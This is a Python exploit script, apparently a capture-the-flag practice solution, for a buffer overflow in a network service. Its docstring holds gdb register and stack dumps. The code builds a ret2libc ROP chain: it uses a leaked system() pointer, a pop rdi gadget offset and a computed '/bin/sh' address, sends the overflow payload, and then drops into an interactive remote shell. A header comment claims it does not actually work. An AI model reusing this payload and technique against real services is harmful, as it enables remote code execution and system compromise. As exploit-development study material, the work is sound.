#!/usr/bin/env python3
"""
Easy2 Solution
by Javantea
Mar 15, 2019

Based on Easy1 Solution
by Javantea
Mar 10-15, 2019

No it doesn't work actually.

(gdb) x/i $rip
=> 0x55e2249fe7cd <main+125>:   retq   
(gdb) x/10gx $rsp
0x7ffe39ac7f78: 0x4746464646464646      0x4847474747474747
0x7ffe39ac7f88: 0x0048484848484848      0x0000000000000000

DEP and ASLR, give them system pointer to make it solvable.

Breakpoint 1, 0x00007f9ebd54f62b in system () from target:/lib64/ld-linux-x86-64.so.2
(gdb) i r 
rax            0x0                 0
rbx            0x4241414141414141  4774168828512911681
rcx            0x7f9ebd5573a7      140319758054311
rdx            0x0                 0
rsi            0x7ffe05510210      140728987615760
rdi            0x1                 1
rbp            0x4342424242424242  0x4342424242424242
rsp            0x7ffe05512ae0      0x7ffe05512ae0
r8             0xfefefefefefefeff  -72340172838076673
r9             0x0                 0
r10            0x7f9ebd59d158      140319758340440
r11            0x202               514
r12            0x4443434343434343  4918849174189065027
r13            0x4544444444444444  4991189347027141700
r14            0x4645454545454545  5063529519865218373
r15            0x0                 0
rip            0x7f9ebd54f62b      0x7f9ebd54f62b <system>

(gdb) x/16gx $rsp-48
0x7ffe05512ab0: 0x4241414141414141      0x4342424242424242
0x7ffe05512ac0: 0x4443434343434343      0x4544444444444444
0x7ffe05512ad0: 0x4645454545454545      0x00007f9ebd54f62b
0x7ffe05512ae0: 0x0000558f5aa4e1e0      0x00007ffe05512b20
0x7ffe05512af0: 0x0000000000000000      0x00007f9ebd5a1b68
0x7ffe05512b00: 0x0400000100003e00      0x0000558f5aa4e20a
0x7ffe05512b10: 0x00007ffe05512b18      0x0000558f5aa4e1e0
0x7ffe05512b20: 0x0000000000000001      0x00007ffe05513eec

To make system work, we need to control rdi. Do we?
rdi            0x1                 1
So no.

So we need a simple rop gadget to mov rdi, whatever we want, and then we can do the next part which is where the hell is /bin/sh?

(gdb) find 0x7f9ebd510000, 0x7f9ebd5a0000, "/bin/sh"
0x7f9ebd59ced9
1 pattern found.

So then we find the offset..
system = 0x7f9ebd54f62b
binsh = 0x7f9ebd59ced9
offset = 317614
"""
from __future__ import print_function
import sys
import socket
import struct
import select
host, port = '127.0.0.1', 3002

if len(sys.argv) > 1: host = sys.argv[1]
if len(sys.argv) > 2: port = int(sys.argv[2])
s = socket.socket()
s.connect((host, port))
pointer_str = s.recv(1024)
if pointer_str.startswith(b'system: 0x'): #and b'\n' in pointer_str:
    system_ptr = int(pointer_str[10:], 16)
    print(pointer_str, 'we have:', hex(system_ptr))
else:
    print("System pointer send failed", pointer_str)
    exit(1)

def q(x):
    return struct.pack('<Q', x)

#0x00007ffea8492bd0
#0x00007fff7a912570
offset = 317614
binsh = q(system_ptr + offset)
print('binsh:', hex(system_ptr + offset))

# pop rdi; ret
#hex(a.index(b'\x5f\xc3'))
'0x173b9'

base = system_ptr - 0x03f62b
print('base:', hex(base))

poprdi_ret = q(0x173b9 + base)
print('poprdi_ret:', hex(0x173b9 + base))

if sys.hexversion >= 0x3000000:
    input("press any key")
else:
    raw_input("press any key")
#end if

ptr = q(system_ptr)
#s.send(b'A'*10239 + b'AAAAAAAA' + b'BBBBBBBB' + b'CCCCCCCC' + b'DDDDDDDD' + b'EEEEEEEE' + b'F' + ptr + b'GGGGGGG' + b'HHHHHHHH')
s.send(b'A'*10239 + b'AAAAAAAA' + b'BBBBBBBB' + b'CCCCCCCC' + b'DDDDDDDD' + b'EEEEEEEE' + b'F' + poprdi_ret + binsh + ptr + b'GGGGGGG')
data = b''

def interact(s):
    """
    telnetlib is bad, this is good.
    """
    if hasattr(sys.stdin, 'buffer'):
        b = sys.stdin.buffer
    else:
        b = sys.stdin
    #end if
    while True:
        v = select.select([s], [], [], 0)
        if s in v[0]:
            d = s.recv(1024)
            if d == b'': break
            try:
                print(d.decode('utf-8'), end='')
            except UnicodeDecodeError as ude:
                print('not unicode', repr(d))
            #end try
        #end if
        v = select.select([b], [], [], 0)
        """
        to_send = b''
        while sys.stdin in v[0]:
            to_send += b.read(1)
            v = select.select([sys.stdin], [], [], 0)
        #end if
        """
        if b in v[0]:
            to_send = b.readline()
            print("sending ", to_send)
            s.send(to_send)
        #end if
    #loop
#end def interact(s)

interact(s)

s.close()

exit(1)
